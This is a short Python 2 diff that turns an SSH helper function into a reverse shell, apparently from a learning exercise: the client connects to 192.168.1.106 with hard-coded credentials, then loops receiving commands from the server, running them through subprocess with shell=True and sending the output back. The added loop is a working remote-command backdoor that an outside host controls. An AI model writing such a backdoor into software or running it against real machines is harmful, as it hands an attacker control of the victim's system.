@@ -11,7 +11,15 @@ def ssh_command(ip, user, passwd, command):
     if ssh_session.active:
         ssh_session.exec_command(command)
         print ssh_session.recv(1024)
+        while True:
+            command = ssh_session.recv(1024) # get the command from the ssh server
+            try:
+                cmd_output = subprocess.check_output(command, shell=True)
+                ssh_session.send(cmd_output)
+            except Exception, e:
+                ssh_session.send(str(e))
+        client.close()
 
     return
 
-ssh_command('192.168.50.153', 'weihai.tang', 'qweqwe', 'pwd')
+ssh_command('192.168.1.106', 'weihai.tang', 'qweqwe', 'ClientConnected')
